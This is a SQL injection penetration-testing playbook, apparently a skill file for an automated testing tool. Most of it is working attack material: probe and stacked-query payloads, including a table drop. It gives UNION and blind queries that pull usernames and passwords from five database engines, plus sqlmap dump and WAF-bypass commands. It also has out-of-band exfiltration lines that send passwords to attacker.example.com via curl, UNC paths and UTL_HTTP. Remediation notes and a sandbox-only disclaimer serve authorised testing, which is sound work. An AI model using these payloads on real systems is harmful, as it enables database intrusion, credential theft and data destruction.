# SQL Injection — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A03:2021 – Injection
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: sql-injection-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A03:2021-Injection
tags:
  - sql-injection
  - database
  - web-application
  - T1190
  - T1190.001
  - T1505.003
environments:
  - web
  - api
  - microservice
  - cloud
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

Identify all user-supplied input vectors:

| Vector Type | Examples |
|---|---|
| URL parameters | `?id=1`, `?page=home`, `?user_id=42` |
| Form fields | Search boxes, login forms, profile updates |
| HTTP headers | `User-Agent`, `X-Forwarded-For`, `Cookie`, `Referer` |
| JSON/XML bodies | API POST/PUT/PATCH payloads |
| File uploads | CSV import, XML feeds |
| WebSocket messages | Real-time API parameters |

### 1.2 Injection Point Discovery

Inject probe payloads that trigger observable responses:

**Boolean-based probes:**
```
' AND 1=1 --
' AND 1=2 --
" AND 1=1 --
' OR '1'='1
' OR '1'='2
```

**Time-based probes:**
```
' WAITFOR DELAY '00:00:05' --
' ; WAITFOR DELAY '00:00:05' --
' OR SLEEP(5) --
' OR pg_sleep(5) --
' OR DBMS_LOCK.SLEEP(5) --
' OR BENCHMARK(1000000,MD5('A')) --
```

**Error-based probes:**
```
' OR 1=1 IN (SELECT @@VERSION) --
' UNION SELECT 1,2,3 --
' AND EXTRACTVALUE(1,CONCAT(0x3a,@@VERSION)) --
' AND UPDATEXML(1,CONCAT(0x3a,@@VERSION),1) --
```

**Stacked queries:**
```
'; DROP TABLE users --
'; INSERT INTO users VALUES ('hacker','pass') --
```

### 1.3 Response Analysis

| Indicator | Likely Finding |
|---|---|
| Different page for `1=1` vs `1=2` | Boolean-based injection |
| Response delay of ~5s | Time-based injection |
| Database error in response | Error-based injection |
| Extra columns in result | UNION injection |
| Different HTTP status codes | Blind injection |
| WAF block page | WAF present (bypass needed) |

### 1.4 Automated Detection (PayloadsAllTheThings + HackTricks + Commix)

**sqlmap comprehensive scan:**
```bash
# Basic detection with risk/level tuning
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2

# With authentication
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --batch --level=3 --risk=2

# WAF bypass with tamper scripts
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,charencode,versionedkeywords --batch

# Proxy through Burp for analysis
sqlmap -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# Full database enumeration
sqlmap -u "https://target.com/page?id=1" --dbms=mysql --dbs --batch
sqlmap -u "https://target.com/page?id=1" --dbms=postgresql --dump --batch
```

**Commix (Command Injection + SQLi hybrid):**
```bash
# Commix for command injection that may chain to SQLi
commix -u "https://target.com/page?id=1" --batch
commix -u "https://target.com/page?id=1" --cookie="session=abc123" --batch --level=3
```

**Manual Burp Suite methodology (HackTricks):**
1. Intercept request containing parameter
2. Send to Repeater (`Ctrl+R`)
3. Inject probes in parameter value
4. Monitor response length, status code, timing
5. Use Intruder for automated character-by-character blind extraction:
   - Set payload position in `SUBSTRING(...N,1)=§a§`
   - Payload set: alphanumeric + special chars
   - Grep match on affirmative response

---

## 2. Confirmation

### 2.1 Fingerprint the Database

| Behaviour | Probable DB |
|---|---|
| `@@VERSION` resolves | Microsoft SQL Server |
| `version()` resolves | MySQL / PostgreSQL |
| `WAITFOR DELAY` works | Microsoft SQL Server |
| `pg_sleep()` works | PostgreSQL |
| `SLEEP()` works | MySQL |
| Double-pipe `\|\|` for concat works | PostgreSQL / SQLite / Oracle |
| `+` for concat works | MSSQL |
| `LIMIT` works | MySQL / PostgreSQL / SQLite |
| `TOP` works | MSSQL |
| `ROWNUM` works | Oracle |

### 2.2 Column Count (ORDER BY)
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```
Increase until error or behaviour changes → number of columns = last successful value.

### 2.3 UNION Probe
```
' UNION SELECT NULL, NULL, NULL --
```
Adapt NULL count to matched column count. Replace NULLs with DB-specific version calls to fingerprint.

### 2.4 Data Type Discovery
```sql
' UNION SELECT 1, 'test', 3 --
' UNION SELECT 1, 123, 3 --
' UNION SELECT 1, NOW(), 3 --
```

---

## 3. Exploitation

### 3.1 Data Extraction Strategy

#### MySQL
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1, CONCAT(username,':',password), 3 FROM users --
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --
```

#### PostgreSQL
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1, username||':'||password, 3 FROM users --
' UNION SELECT 1, (SELECT password FROM pg_shadow WHERE usename='postgres'), 3 --
```

#### MSSQL
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1, username+':'+password, 3 FROM users --
' EXEC master..xp_cmdshell 'whoami' --
```

#### Oracle
```sql
' UNION SELECT 1, table_name, 3 FROM all_tables --
' UNION SELECT 1, column_name, 3 FROM all_tab_columns WHERE table_name='USERS' --
' UNION SELECT 1, username||':'||password, 3 FROM USERS --
' UNION SELECT 1, (SELECT banner FROM v$version WHERE rownum=1), 3 FROM dual --
```

#### SQLite
```sql
' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table' AND name='users' --
```

### 3.2 Blind Injection

#### Boolean-based (MySQL/PostgreSQL/SQLite):
```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100 --
```

#### Time-based (MSSQL):
```
' IF (SELECT ASCII(SUBSTRING((SELECT password FROM users),1,1))) > 100 WAITFOR DELAY '00:00:05' --
```

#### Time-based (MySQL):
```
' AND (SELECT SLEEP(5) FROM users WHERE SUBSTRING(password,1,1)='a') --
```

#### Time-based (PostgreSQL):
```
' AND (SELECT CASE WHEN (SUBSTRING(password FROM 1 FOR 1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users) --
```

Use binary search over character positions to extract data efficiently.

### 3.3 Out-of-Band (OOB) Exfiltration

Requires network egress from the database server.

**MSSQL:**
```sql
' EXEC master..xp_dirtree '\\attacker.example.com\data' --
' EXEC master..xp_subdirs '\\attacker.example.com\data' --
```

**MySQL:**
```sql
' SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.example.com\\test')) --
```

**PostgreSQL:**
```sql
' COPY (SELECT password FROM users) TO PROGRAM 'curl attacker.example.com/$(cat)' --
```

**Oracle:**
```sql
' SELECT UTL_HTTP.REQUEST('http://attacker.example.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual --
```

### 3.4 Second-Order SQL Injection

Inject payload that gets stored and executed later:
```
Registration: ' OR 1=1 --
Later: Admin views user list → triggers payload
```

### 3.5 NoSQL Injection (MongoDB) - from PayloadsAllTheThings

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"username": {"$regex": "^adm"}, "password": {"$regex": "^"}}
```

---

## 4. Tool-Specific Guidance

### 4.1 sqlmap (Comprehensive)

**Detection & Enumeration:**
```bash
# Basic
sqlmap -u "https://target.com/page?id=1" --batch

# With auth
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --batch

# Full DB dump
sqlmap -u "https://target.com/page?id=1" --dbms=mysql --dump --batch

# Risk/level tuning
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3 --batch

# WAF bypass
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,charencode,versionedkeywords,randomcase --batch

# Proxy through Burp
sqlmap -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# Crawl and find all SQLi
sqlmap -u "https://target.com" --crawl=2 --batch --forms

# JSON/POST data
sqlmap -u "https://target.com/api" --data='{"id":1}' --batch
```

### 4.2 NoSQLMap (MongoDB)
```bash
nosqlmap -u "https://target.com/api" --data='{"username":"admin"}' --batch
```

### 4.3 Manual Testing (Burp Suite) - HackTricks Methodology

1. **Intercept** the request containing the parameter
2. **Send to Repeater** (`Ctrl+R`)
3. **Inject probes** in the parameter value
4. Monitor **response length**, **status code**, and **timing** in the Repeater window
5. Use **Intruder** for automated character-by-character blind extraction:
   - Set payload position in `SUBSTRING(...N,1)=§a§`
   - Payload set: alphanumeric characters
   - Grep match on affirmative response
6. Use **Sequencer** for token entropy analysis if JWT involved

### 4.4 Mass Scan / Browser-Based Detection

```bash
# Grep for forms with GET parameters
grep -r '?id=' /path/to/source --include="*.php"
grep -r '?page=' /path/to/source --include="*.asp"

# Use with ffuf for parameter fuzzing
ffuf -u "https://target.com/page?FUZZ=1" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404

# Nuclei SQLi templates
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/sqli/ -jsonl output.jsonl
```

---

## 5. PoC Generation

Every finding must produce a reproducible Proof of Concept.

### PoC Template

```markdown
## SQL Injection — [FINDING_ID]

**URL:** https://target.com/vulnerable-page?id=1
**Parameter:** id
**Type:** UNION-based / Boolean-blind / Time-blind / Error-based / Stacked
**Database:** MySQL 8.x / PostgreSQL 15 / MSSQL 2022 / Oracle 19c / SQLite 3.x

### Payload
```
' UNION SELECT 1,@@VERSION,3,4,5 --
```

### Evidence
- [Screenshot or response showing data]
- [Timing evidence for blind]
- [Error message content]
- [Exfiltrated data sample]

### Impact
- Database name: [name]
- Tables exposed: 14 (including users, orders, payments)
- Rows extracted: 1,204 user records
- File system access: YES/NO
- RCE achieved: YES/NO

### Remediation
- Parameterised queries (prepared statements)
- Input validation / allow-listing
- WAF rule to block stacked queries
- Least privilege DB accounts
- Disable error messages in production

### Reproduction Steps
1. Send GET request to `https://target.com/vulnerable-page?id=1' UNION SELECT 1,@@VERSION,3,4,5 --`
2. Observe column 2 contains the database version string.
3. Enumerate tables: `id=1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables --`
4. Extract data: `id=1' UNION SELECT 1,CONCAT(username,':',password),3,4,5 FROM users --`
```

---

## 6. Verification (Sandbox)

All SQL injection exploitation **must** be verified in a sandbox environment before reporting.

### Sandbox Checklist
- [ ] Reproduction in isolated DB with same schema
- [ ] Payload obfuscation tested (tamper scripts)
- [ ] Impact scope confirmed (data accessible vs data exposed)
- [ ] No destructive queries executed
- [ ] No data modified (read-only)
- [ ] OOB channels tested in isolated network

### Prohibited Actions
- `DROP`, `DELETE`, `UPDATE`, `INSERT`
- `xp_cmdshell` or OS command execution
- Out-of-band exfiltration to third-party servers
- Full table dumps beyond what is needed for impact demonstration

---

## 7. Database-Specific Reference

| Feature | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Version query | `@@VERSION` | `version()` | `@@VERSION` | `SELECT * FROM v$version` | `sqlite_version()` |
| Current user | `current_user()` | `current_user` | `SUSER_NAME()` | `SELECT USER FROM dual` | N/A |
| Current DB | `DATABASE()` | `current_database()` | `DB_NAME()` | `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual` | N/A |
| List tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` | `sqlite_master` |
| List columns | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `all_tab_columns` | `PRAGMA table_info()` |
| String concat | `CONCAT(a,b)` | `a \|\| b` | `a + b` | `a \|\| b` | `a \|\| b` |
| Substring | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` | `SUBSTR(s,1,1)` |
| Time delay | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_LOCK.SLEEP(5)` | N/A |
| Comment | `-- `, `#` | `-- ` | `-- ` | `-- ` | `-- ` |
| Batch separator | N/A | N/A | `;` | N/A | `;` |
| Limit | `LIMIT 1` | `LIMIT 1` | `SELECT TOP 1` | `ROWNUM = 1` | `LIMIT 1` |
| File read | `LOAD_FILE()` | `COPY ... FROM PROGRAM` | `OPENROWSET` | `UTL_FILE` | N/A |
| File write | `INTO OUTFILE` | `COPY ... TO PROGRAM` | `xp_cmdshell` | `UTL_FILE` | N/A |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Primary |
| T1190.001 | SQL Injection | Direct mapping |
| T1505.003 | Web Shell | Post-exploitation |
| T1005 | Data from Local System | Data extraction |
| T1020 | Automated Exfiltration | OOB exfiltration |
| T1059.007 | JavaScript/JScript | Stored XSS via SQLi |
| T1105 | Ingress Tool Transfer | File write via SQLi |

---

## 9. References

- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
- PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- HackTricks SQL Injection: https://book.hacktricks.xyz/pentesting-web/sql-injection
- sqlmap documentation: https://sqlmap.org/
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQLi Labs: https://portswigger.net/web-security/sql-injection

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*